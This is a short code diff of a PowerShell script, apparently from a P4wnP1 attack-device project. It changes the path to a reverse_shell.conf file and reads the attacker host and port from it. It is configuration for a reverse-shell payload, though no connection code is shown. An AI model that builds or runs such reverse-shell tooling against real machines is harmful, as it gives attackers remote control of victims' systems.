@@ -1,4 +1,4 @@
-$conf = Get-Content "/opt/p4wnp1-o2/config/reverse_shell.conf" | ConvertFrom-StringData
+$conf = Get-Content "/opt/p4wnp1/config/reverse_shell.conf" | ConvertFrom-StringData
 $HOST = $conf["RS_HOST"]
 $PORT = [int]$conf["RS_PORT"]
 
